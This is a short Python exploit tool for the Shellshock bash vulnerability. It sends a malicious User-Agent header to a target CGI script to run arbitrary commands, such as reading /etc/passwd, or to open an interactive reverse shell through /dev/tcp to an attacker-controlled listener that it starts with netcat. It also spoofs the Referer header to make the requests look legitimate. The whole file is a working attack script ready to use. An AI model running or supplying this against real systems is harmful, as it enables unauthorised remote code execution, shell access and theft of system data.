#!/usr/bin/env python3

import argparse
import os
import requests
import subprocess
import time

banner = '''
#######################################
# Shellshock Exploit with Command Exec #

# Author: sergiovks 
#######################################
'''

def exploit(url, route_to_cgi, command, shell, lhost, lport, timeout, referer_spoof):
    if shell:
        print("[+] Starting reverse shell to {}:{}".format(lhost, lport))
        subprocess.Popen(["rlwrap", "nc", "-nlvp", str(lport)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(1)
        payload = "() { :; }; echo ; /bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)
        headers = {"User-Agent": payload}
    else:
        headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '{}'".format(command)}

    if referer_spoof:
        headers["Referer"] = referer_spoof

    cgi_url = url + route_to_cgi
    response = requests.get(cgi_url, headers=headers, timeout=timeout)
    if response.status_code == 200:
        print("[+] Exploit executed successfully:")
        print(response.text)
    else:
        print("[!] Exploit failed. The server may not be vulnerable to Shellshock.")

def main():
    parser = argparse.ArgumentParser(description='Shellshock exploit with command execution or reverse shell spawn')
    parser.add_argument('-u', '--url', required=True, help='Target URL (root path), for example: http://example.com')
    parser.add_argument('-r', '--route-to-cgi', required=True, help='Route to CGI script, for example /cgi-bin/time.sh')
    parser.add_argument('-c', '--command', help='Command to execute, for example "cat /etc/passwd" USE SINGLE OR DOUBLE QUOTES')
    parser.add_argument('-s', '--shell', action='store_true', help='Spawn a reverse shell (lhost and lport arguments needed)')
    parser.add_argument('-lh', '--lhost', help='Local host for reverse shell, for example: 10.10.14.6')
    parser.add_argument('-lp', '--lport', help='Local port for reverse shell, for example 443')
    parser.add_argument('-to', '--timeout', type=int, default=10, help='Timeout in seconds for HTTP requests, default is 10')
    parser.add_argument('-R', '--referer-spoof', help='Referer spoofing header (trustable URL), \nf. ex: https://www.google.com/search?q=cabecera+referer&oq=cabecera+referer&aqs=chrome..69i57j69i59l2j0l4j69i60.3531j0j7&sourceid=chrome&ie=UTF-8')
    args = parser.parse_args()

    if args.shell and (not args.lhost or not args.lport):
        parser.error("Please specify a local host and port to spawn the reverse shell")

    print(banner)
    exploit(args.url, args.route_to_cgi, args.command, args.shell, args.lhost, args.lport, args.timeout, args.referer_spoof)

if __name__ == '__main__':
    main()
